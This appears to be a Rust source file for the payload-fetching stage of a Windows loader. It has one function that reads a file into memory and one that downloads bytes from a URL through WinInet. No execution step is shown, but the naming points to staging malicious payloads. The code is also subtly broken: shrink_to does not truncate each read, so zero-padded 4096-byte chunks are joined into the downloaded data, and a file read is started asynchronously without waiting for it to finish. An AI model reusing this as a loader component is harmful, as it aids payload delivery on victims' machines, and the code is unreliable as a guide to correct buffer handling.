use std::ffi::c_void;

use windows::Win32::{
    Foundation::{GENERIC_READ, S_OK},
    Networking::WinInet::{
        INTERNET_BUFFERSA, INTERNET_BUFFERSW, INTERNET_FLAG_KEEP_CONNECTION,
        INTERNET_OPEN_TYPE_PRECONFIG, IRF_ASYNC, IRF_SYNC, InternetCloseHandle, InternetOpenUrlW,
        InternetOpenW, InternetReadFile, InternetReadFileExA, InternetReadFileExW,
        WININET_API_FLAG_SYNC,
    },
    Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_CREATION_DISPOSITION, FILE_SHARE_READ,
        GetFileSizeEx, ReadFileEx,
    },
    System::IO::OVERLAPPED,
};
use windows_core::{BSTR, PCWSTR, w};

pub fn get_payload_from_filesystem<T: AsRef<str>>(file_path: T) -> Vec<u8>
where
    BSTR: From<T>,
{
    let hwnd = unsafe {
        CreateFileW(
            PCWSTR(BSTR::from(file_path).into_raw()),
            GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            FILE_CREATION_DISPOSITION(0x3),
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .unwrap()
    };

    let mut lpfilesize = 0_i64;
    unsafe { GetFileSizeEx(hwnd, &mut lpfilesize).unwrap() };
    let mut buf = vec![0_u8; lpfilesize as usize];
    let mut overlapped = OVERLAPPED::default();

    unsafe { ReadFileEx(hwnd, Some(&mut buf), &mut overlapped, None).unwrap() };
    buf
}

const BUFFER_SIZE: usize = 4096;

pub fn get_payload_from_url<T: AsRef<str>>(url: T) -> Vec<u8>
where
    BSTR: From<T>,
{
    let handle_open = unsafe {
        InternetOpenW(
            w!("agent"),
            INTERNET_OPEN_TYPE_PRECONFIG.0,
            PCWSTR::null(),
            PCWSTR::null(),
            0,
        )
    };

    let handle_url = unsafe {
        InternetOpenUrlW(
            handle_open,
            PCWSTR::from_raw(BSTR::from(url).into_raw()),
            None,
            INTERNET_FLAG_KEEP_CONNECTION,
            None,
        )
    };

    let mut buf = vec![];
    let mut read_count = 0_u32;

    loop {
        let mut tmp_buf = vec![0_u8; BUFFER_SIZE];
        unsafe {
            InternetReadFile(
                handle_url,
                tmp_buf.as_mut_ptr() as *mut c_void,
                BUFFER_SIZE as u32,
                &mut read_count,
            )
        }
        .unwrap();

        tmp_buf.shrink_to(read_count as usize);
        buf.push(tmp_buf);

        if read_count == 0 {
            break;
        }
    }

    let buf = buf.concat();

    unsafe {
        let _ = InternetCloseHandle(handle_url);
        let _ = InternetCloseHandle(handle_open);
    }
    buf
}
